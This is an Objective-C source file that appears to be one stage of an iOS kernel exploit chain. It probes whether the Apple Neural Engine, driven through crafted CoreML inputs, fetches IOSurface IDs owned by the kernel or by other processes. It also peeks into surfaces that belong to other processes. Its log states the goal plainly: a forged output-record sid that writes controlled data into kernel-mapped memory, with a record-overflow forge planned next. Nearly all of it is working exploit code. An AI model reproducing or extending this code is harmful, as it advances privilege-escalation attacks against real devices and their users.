//
//  P082AneKernelSid.m — kernel-sid fetch map + staging IOSurfaceLookup. See header.
//

#import "P082AneKernelSid.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <math.h>
#import <string.h>
#import <unistd.h>

#define P082_BUILD     @"p082-kernelsid-v1"
#define P082_MODEL_A   @"XVRC27_127in_1out"
#define P082_N_IN      127u
#define P082_N_SURF    412u
#define P082_CAP_MARK  0x53535353u
#define P082_ZERO      0x00000000u
#define P082_REPS      20u
#define P082_ENGAGE_MS 1.0
#define P082_K_MAX     24u      /* kernel sids 1..24 */
#define P082_L_MAX     24u      /* staging lookup targets */
#define P082_L_CREATE  64u      /* creates to scan for fresh gaps */

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p082_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p082_iosGetID_t)(IOSurfaceRef);
typedef IOSurfaceRef (*p082_iosLookup_t)(uint32_t);
typedef void *(*p082_iosBase_t)(IOSurfaceRef);
typedef size_t (*p082_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p082_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p082_surf_t;

static int g_p082_fd = -1;
static NSMutableString *g_p082_buf;

static void p082_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P082AneKernelSid class]) {
        if (g_p082_buf) [g_p082_buf appendString:out];
        if (g_p082_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p082_fd, s, strlen(s));
                fcntl(g_p082_fd, F_FULLFSYNC);
            }
        }
    }
}

#pragma mark - IOSurface helpers

static p082_iosCreate_t  s_iosCreate;
static p082_iosGetID_t   s_iosGetID;
static p082_iosLookup_t  s_iosLookup;
static p082_iosBase_t    s_iosBase;
static p082_iosAllocSz_t s_iosAllocSz;
static p082_iosLock_t    s_iosLock;
static p082_iosLock_t    s_iosUnlock;

static BOOL p082_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p082_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p082_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosLookup  = (p082_iosLookup_t)dlsym(h, "IOSurfaceLookup");
    s_iosBase    = (p082_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p082_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p082_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p082_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosLookup && s_iosBase && s_iosAllocSz
           && s_iosLock && s_iosUnlock;
}

static CFNumberRef p082_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p082_surface_create(void) {
    CFNumberRef w = p082_cfnum(1), h = p082_cfnum(1);
    CFNumberRef bpe = p082_cfnum(4), fmt = p082_cfnum(0x42475241);
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static void p082_surface_fill_u32(IOSurfaceRef s, uint32_t pattern) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || sz > (16UL << 20)) return;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return;
    uint32_t *p = (uint32_t *)base;
    for (size_t k = 0; k + 4 <= sz; k += 4) p[k / 4] = pattern;
    s_iosUnlock(s, 0, NULL);
}

/* read-only peek: first 16 bytes of a surface we did NOT create */
static void p082_peek(IOSurfaceRef s, uint32_t sid) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz < 16) {
        p082_log(@"  L peek sid=%u size=%zu base=%s", sid, sz, base ? "yes" : "no");
        return;
    }
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) {
        p082_log(@"  L peek sid=%u LOCK FAILED", sid);
        return;
    }
    const uint8_t *b = (const uint8_t *)base;
    s_iosUnlock(s, 0, NULL);
    p082_log(@"  L peek sid=%u size=%zu b[0..15]=%02x %02x %02x %02x %02x %02x %02x %02x"
             @" %02x %02x %02x %02x %02x %02x %02x %02x",
             sid, sz, b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7],
             b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]);
}

#pragma mark - CoreML

static NSURL *p082_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p082_load(NSURL *url, MLComputeUnits units, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = units;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

static MLDictionaryFeatureProvider *p082_provider_values(const double *vals, uint32_t nIn,
                                                         NSError **errOut) {
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < nIn; i++) {
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                   dataType:MLMultiArrayDataTypeDouble
                                                      error:nil];
        if (!m) return nil;
        m[0] = @(vals[i]);
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

static double p082_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                           NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    *dur = t1 - t0;
    if (!pred) return NAN;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    return ya ? ya[0].doubleValue : NAN;
}

static NSString *p082_yfmt(double y) {
    return (y == y) ? [NSString stringWithFormat:@"%.6e", y] : @"NaN";
}

static void p082_finish(uint32_t made, p082_surf_t *surfs) {
    for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);
    if (g_p082_fd >= 0) { fcntl(g_p082_fd, F_FULLFSYNC); close(g_p082_fd); g_p082_fd = -1; }
}

static NSString *p082_return(void) {
    NSString *ret = g_p082_buf;
    g_p082_buf = nil;
    return ret;
}

@implementation P082AneKernelSid

+ (NSString *)tap {
    g_p082_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p082_ane_kernelsid_log.txt"];
    g_p082_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p082_log(@"=== p082 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P082_BUILD);
    p082_log(@"p081 proved the ANE record fetch resolves FOREIGN sids (gap 322,");
    p082_log(@"no error, on-ANE). Two follow-ups, one tap:");
    p082_log(@"  K. kernel-sid fetch map: x_126 = 1..24 (pre-boot ids).");
    p082_log(@"     no-abort => kernel-owned surfaces are ANE-fetchable =>");
    p082_log(@"     Chain 2 forged output-record-sid hop has kernel targets.");
    p082_log(@"  L. IOSurfaceLookup on post-predict gap ids (espresso staging");
    p082_log(@"     churn). hit => staging visible in OUR registry. miss =>");
    p082_log(@"     ANE fetch bypasses the per-task IOSurface registry.");
    p082_log(@"PANIC POSSIBLE in K. Read-only peeks in L - no foreign writes.");
    p082_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p082"];
    if (stop) {
        p082_log(@"%@", stop);
        p082_finish(0, NULL);
        return p082_return();
    }
    p082_log(@"%@", [LabDeviceProfile identBlock]);

    if (!p082_resolve_iosurface()) {
        p082_log(@"[-] IOSurface dlsym FAILED - abort");
        p082_log(@"=== VERDICT === abort (iosurface). hasKread=NO hasKwrite=NO.");
        p082_finish(0, NULL);
        return p082_return();
    }

    /* ---- surfaces + capture pre-consumption + fresh staging gaps ---- */
    p082_surf_t *surfs = calloc(P082_N_SURF, sizeof(p082_surf_t));
    uint32_t made = 0;
    uint32_t stageGaps[P082_L_MAX];
    uint32_t nStageGaps = 0;
    uint32_t prevSid = 0;

    IOSurfaceRef first = p082_surface_create();
    if (!first) {
        p082_log(@"[-] first create FAILED - abort");
        p082_log(@"=== VERDICT === abort (first create). hasKread=NO hasKwrite=NO.");
        p082_finish(0, NULL);
        return p082_return();
    }
    {
        uint32_t f0 = s_iosGetID(first);
        p082_log(@"[+] pre-consumption: first sid this boot = %u => ids 1..%u were",
                 f0, f0 - 1);
        p082_log(@"    taken by kernel/boot/other processes before us (K target pool)");
        prevSid = f0;
        surfs[made].surf = first;
        surfs[made].sid = f0;
        surfs[made].allocSize = s_iosAllocSz(first);
        made++;
    }
    for (uint32_t i = 1; i < P082_N_SURF; i++) {
        IOSurfaceRef s = p082_surface_create();
        if (!s) continue;
        uint32_t sid = s_iosGetID(s);
        prevSid = sid;
        surfs[made].surf = s;
        surfs[made].sid = sid;
        surfs[made].allocSize = s_iosAllocSz(s);
        made++;
    }
    p082_log(@"[+] surfaces: %u/%u (ids %u..%u)", made, P082_N_SURF, surfs[0].sid, prevSid);
    if (made < P082_N_IN + 2) {
        p082_log(@"[-] need >= %u surfaces - abort", P082_N_IN + 2);
        p082_log(@"=== VERDICT === abort (surfaces). hasKread=NO hasKwrite=NO.");
        p082_finish(made, surfs);
        return p082_return();
    }
    p082_surf_t *cap = &surfs[made - 1];
    uint32_t nCand = made - 1;

    for (uint32_t i = 0; i < made; i++) {
        p082_surface_fill_u32(surfs[i].surf, (&surfs[i] == cap) ? P082_CAP_MARK : P082_ZERO);
    }
    p082_log(@"[+] capture sid_C=%u staged MARK; %u candidates staged ZERO",
             cap->sid, nCand);

    /* ---- load models ---- */
    NSError *err = nil;
    MLModel *modelA = p082_load(p082_model_url(P082_MODEL_A), MLComputeUnitsAll, &err);
    if (!modelA) {
        p082_log(@"[-] load A FAILED: %@", err.localizedDescription ?: @"-");
        p082_log(@"=== VERDICT === abort (load A). hasKread=NO hasKwrite=NO.");
        p082_finish(made, surfs);
        return p082_return();
    }
    MLModel *modelACpu = p082_load(p082_model_url(P082_MODEL_A), MLComputeUnitsCPUOnly, &err);
    p082_log(@"[+] A loaded (All); cpuOnly twin %@", modelACpu ? @"loaded" : @"FAILED");

    /* ---- PHASE G: engagement gate ---- */
    double sids[P082_N_IN];
    for (uint32_t i = 0; i < P082_N_IN; i++) sids[i] = (double)surfs[i].sid;
    MLDictionaryFeatureProvider *fpG = p082_provider_values(sids, P082_N_IN, &err);
    if (!fpG) {
        p082_log(@"[-] provider G FAILED - abort");
        p082_log(@"=== VERDICT === abort (provider). hasKread=NO hasKwrite=NO.");
        p082_finish(made, surfs);
        return p082_return();
    }
    p082_log(@"--- PHASE G: engagement gate (live sids) ---");
    double yW = NAN;
    NSTimeInterval d = 0;
    NSTimeInterval minAll = 1e9, minCpu = 1e9;
    for (uint32_t r = 0; r < P082_REPS; r++) {
        err = nil;
        yW = p082_predict(modelA, fpG, &d, &err);
        if (d < minAll) minAll = d;
    }
    if (modelACpu) {
        for (uint32_t r = 0; r < P082_REPS; r++) {
            NSTimeInterval dc = 0;
            err = nil;
            p082_predict(modelACpu, fpG, &dc, &err);
            if (dc < minCpu) minCpu = dc;
        }
    }
    BOOL engaged = modelACpu && (minAll > minCpu + P082_ENGAGE_MS / 1000.0);
    p082_log(@"[*] GATE y=%@ minAll=%.2fms minCpu=%.2fms -> ANE %s",
             p082_yfmt(yW), minAll * 1000.0, minCpu * 1000.0,
             engaged ? "ENGAGED" : "NOT ENGAGED");
    if (!engaged) {
        p082_log(@"=== VERDICT === ANE not engaged this boot - rerun fresh boot.");
        p082_log(@"hasKread=NO hasKwrite=NO.");
        p082_finish(made, surfs);
        return p082_return();
    }

    /* ---- PHASE K: kernel-sid fetch map ---- */
    p082_log(@"--- PHASE K: kernel-sid fetch map (x_126 = 1..%u) ---", P082_K_MAX);
    double kVals[P082_N_IN];
    for (uint32_t i = 0; i < P082_N_IN - 1; i++) kVals[i] = sids[i];

    /* control first: own sid */
    kVals[P082_N_IN - 1] = sids[1];
    MLDictionaryFeatureProvider *fpC = p082_provider_values(kVals, P082_N_IN, &err);
    if (fpC) {
        err = nil;
        double yC = p082_predict(modelA, fpC, &d, &err);
        p082_log(@"[*] K-control x126=sid1=%u y=%@ t=%.2fms err=%@",
                 (uint32_t)sids[1], p082_yfmt(yC), d * 1000.0,
                 err.localizedDescription ?: @"none");
    }

    uint32_t kLive = 0, kDead = 0;
    for (uint32_t k = 1; k <= P082_K_MAX; k++) {
        kVals[P082_N_IN - 1] = (double)k;
        MLDictionaryFeatureProvider *fpK = p082_provider_values(kVals, P082_N_IN, &err);
        if (!fpK) continue;
        err = nil;
        double yK = p082_predict(modelA, fpK, &d, &err);
        BOOL live = (err == nil);
        if (live) kLive++; else kDead++;
        p082_log(@"[*] K sid=%2u y=%@ t=%.2fms err=%@ -> %s",
                 k, p082_yfmt(yK), d * 1000.0, err.localizedDescription ?: @"none",
                 live ? "FETCH RESOLVED (kernel-owned surface)" : "nullptr/dead");
    }
    p082_log(@"[*] K RESULT: %u resolved / %u dead of %u",
             kLive, kDead, P082_K_MAX);

    /* ---- PHASE L: staging gap capture + IOSurfaceLookup ---- */
    p082_log(@"--- PHASE L: staging gaps + IOSurfaceLookup ---");
    {
        uint32_t lPrev = prevSid;
        for (uint32_t i = 0; i < P082_L_CREATE; i++) {
            IOSurfaceRef s = p082_surface_create();
            if (!s) continue;
            uint32_t sid = s_iosGetID(s);
            if (lPrev && sid > lPrev + 1) {
                for (uint32_t g = lPrev + 1; g < sid && nStageGaps < P082_L_MAX; g++) {
                    stageGaps[nStageGaps++] = g;
                }
            }
            lPrev = sid;
            CFRelease(s);
        }
        p082_log(@"[+] fresh post-predict gap ids captured: %u (first %u)",
                 nStageGaps, nStageGaps ? stageGaps[0] : 0);

        uint32_t lHit = 0;
        for (uint32_t i = 0; i < nStageGaps; i++) {
            uint32_t g = stageGaps[i];
            IOSurfaceRef f = s_iosLookup(g);
            if (f) {
                lHit++;
                p082_log(@"[*] L LOOKUP HIT sid=%u (size %zu) - visible in OUR registry",
                         g, s_iosAllocSz(f));
                p082_peek(f, g);
                CFRelease(f);
            } else {
                p082_log(@"[*] L lookup MISS sid=%u (per-task registry)", g);
            }
        }
        p082_log(@"[*] L RESULT: %u/%u lookups hit", lHit, nStageGaps);
    }

    /* ---- verdict ---- */
    p082_log(@"=== VERDICT ===");
    if (kLive > 0) {
        p082_log(@"KERNEL-SID FETCH: %u of %u pre-boot ids resolved with no error.",
                 kLive, P082_K_MAX);
        p082_log(@"Kernel-owned surface ids are ANE-fetchable. Chain 2 (forged");
        p082_log(@"OUTPUT record sid -> kernel surface -> controlled y write into");
        p082_log(@"kernel-mapped memory) has live targets. Next: 43748 record");
        p082_log(@"overflow forge (P044 v47 / 102 Chain 1) then output-sid forge.");
        [[P007Board shared] recordEvent:@"p082_session" kind:@"kernel_fetch"
                                 detail:[NSString stringWithFormat:@"live=%u", kLive]
                                 source:@"p082"];
    } else {
        p082_log(@"KERNEL-SID FETCH: all 1..%u dead/nullptr. Early ids were freed",
                 P082_K_MAX);
        p082_log(@"or the fetch scope excludes them. Foreign fetch (p081) stands;");
        p082_log(@"kernel-target question moves to higher sids or IOMFB pool scan.");
        [[P007Board shared] recordEvent:@"p082_session" kind:@"kernel_dead"
                                 detail:@"1..24 nullptr" source:@"p082"];
    }
    p082_log(@"Honesty: fetch/mapping is not a write. Conversion bar untouched.");
    p082_log(@"hasKread=NO hasKwrite=NO. One TAP per force-quit; fresh boot next tap.");

    p082_finish(made, surfs);
    return p082_return();
}

@end